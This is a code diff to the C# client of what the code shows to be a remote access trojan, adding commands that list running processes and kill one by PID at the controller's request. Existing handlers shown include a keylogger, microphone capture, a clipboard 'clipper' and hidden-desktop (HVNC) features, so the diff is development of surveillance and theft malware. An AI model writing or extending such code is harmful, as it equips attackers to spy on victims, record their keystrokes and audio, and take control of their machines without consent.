@@ -350,6 +350,20 @@ internal class TlsClient : IDisposable
                     MicrophoneFeature.Stop();
                     break;
 
+                // ── Process Manager ─────────────────────────────────
+                case PacketType.ProcGetList:
+                    _ = WritePacketAsync(new Packet
+                    {
+                        Type = PacketType.ProcListResult,
+                        Data = ProcessManagerFeature.GetProcessList()
+                    }, ct);
+                    break;
+
+                case PacketType.ProcKill:
+                    var procKill = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ProcKillDataStub);
+                    if (procKill != null) ProcessManagerFeature.Kill(procKill.Pid);
+                    break;
+
                 // ── Keylogger ────────────────────────────────────────
                 case PacketType.KeyloggerStart:
                     KeyloggerFeature.Start();
@@ -1299,6 +1313,10 @@ internal enum PacketType
     KeyloggerFileContent = 178,
     KeyloggerDeleteFile  = 179,
 
+    ProcGetList    = 190,
+    ProcListResult = 191,
+    ProcKill       = 192,
+
     ClipperSetConfig    = 180,
     ClipperGetStats     = 181,
     ClipperStatsResult  = 182,
@@ -1465,6 +1483,11 @@ internal class HvncClipboardDataStub
 // Fun
 [JsonSerializable(typeof(FunCmdDataStub))]
 [JsonSerializable(typeof(FunResultStub))]
+// Process Manager
+[JsonSerializable(typeof(ProcEntryStub))]
+[JsonSerializable(typeof(ProcListResultStub))]
+[JsonSerializable(typeof(ProcKillDataStub))]
+[JsonSerializable(typeof(List<ProcEntryStub>))]
 // Keylogger
 [JsonSerializable(typeof(KeyloggerLogsResultStub))]
 [JsonSerializable(typeof(KeyloggerFileInfo))]
